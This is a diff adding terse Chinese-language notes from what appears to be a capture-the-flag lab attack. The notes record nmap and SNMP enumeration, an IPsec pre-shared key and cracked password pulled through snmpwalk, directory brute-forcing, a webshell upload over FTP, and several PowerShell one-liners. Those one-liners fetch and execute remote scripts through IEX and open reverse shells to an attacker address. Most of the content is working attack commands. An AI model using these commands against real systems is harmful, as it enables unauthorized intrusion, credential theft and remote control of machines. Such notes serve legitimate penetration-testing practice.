@@ -1,0 +1,43 @@
+nmap -sV -sC -Pn 10.129.137.170 > nmap.txt
+nmap -p- 10.129.137.170 > nmapall.txt
+nmap -sU 10.129.137.170 > nmapuu.txt
+nmap -sTVC  -Pn 10.129.137.170 > nmaptt.txt
+
+1.發現服務契友TCP的port但nmap檢測不到
+snmp-check  10.129.138.26
+
+[*] TCP connections and listening ports:
+
+  Local address         Local port            Remote address        Remote port           State
+  0.0.0.0               21                    0.0.0.0               0                     listen
+  0.0.0.0               80                    0.0.0.0               0                     listen
+  0.0.0.0               135                   0.0.0.0               0                     listen
+  0.0.0.0               445                   0.0.0.0               0                     listen
+  0.0.0.0               49664                 0.0.0.0               0                     listen
+  0.0.0.0               49665                 0.0.0.0               0                     listen
+  0.0.0.0               49666                 0.0.0.0               0                     listen
+  0.0.0.0               49667                 0.0.0.0               0                     listen
+  0.0.0.0               49668                 0.0.0.0               0                     listen
+  0.0.0.0               49669                 0.0.0.0               0                     listen
+  0.0.0.0               49670                 0.0.0.0               0                     listen
+  10.129.138.26         139                   0.0.0.0               0                     listen
+
+2.snmapwalk可以查到ipsec的密碼
+snmpwalk -c public -v2c 10.129.138.26
+
+ STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
+ 9c8b1a372b1878851be2c097031b6e43:Dudecake1!
+3.設置ipsec並啟用服務,參考ippsec的conceal影片
+sudo ipsec start --nofork
+4.掃描80port發現有upload
+gobuster dir  -u http://10.129.138.26/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,py,cgi > gobuster.txt
+5.ftp登入後上傳檔案可在upload訪問到
+6.使用網上下載的webshell才可以正常執行
+7.因檔案會一直被刪除,取得shell後馬上執行以下指令
+powershell "IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.50/rev.ps1')"
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.50",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+
+
+powershell "IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.50/Invoke-PowerShellTcp.ps1')"
